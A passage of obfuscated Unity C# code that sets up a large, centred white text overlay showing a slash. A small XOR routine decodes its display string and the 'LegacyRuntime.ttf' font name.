        _0x84eb34f5.anchorMax = new Vector2(0.5f, 0.5f);
        _0x84eb34f5.pivot = new Vector2(0.5f, 0.5f);
        _0x84eb34f5.sizeDelta = new Vector2(600f, 600f);
        _0x84eb34f5.anchoredPosition = Vector2.zero;
        _0x23aa08ce = _0x1b1b5926.GetComponent<Text>();
        _0x23aa08ce.text = _0x019ade1a._0xa5740c93(new byte[1] { 132 }, 171);
        _0x23aa08ce.font = Resources.GetBuiltinResource<Font>(_0x019ade1a._0xa5740c93(new byte[17] { 247, 222, 220, 218, 216, 194, 233, 206, 213, 207, 210, 214, 222, 149, 207, 207, 221 }, 187));
        _0x23aa08ce.fontSize = 200;
        _0x23aa08ce.alignment = TextAnchor.MiddleCenter;
        _0x23aa08ce.color = Color.white;
        _0x23aa08ce.raycastTarget = false;
        _0x1b1b5926.SetActive(false);
    }

    private string _0xc99f1e39 = "";
}

internal static class _0x019ade1a
{
    internal static string _0xa5740c93(byte[] data, byte key)
    {
        var buffer = new byte[data.Length];
        for (var i = 0; i < data.Length; i++)
            buffer[i] = (byte)(data[i] ^ key);
        return System.Text.Encoding.UTF8.GetString(buffer);
    }
}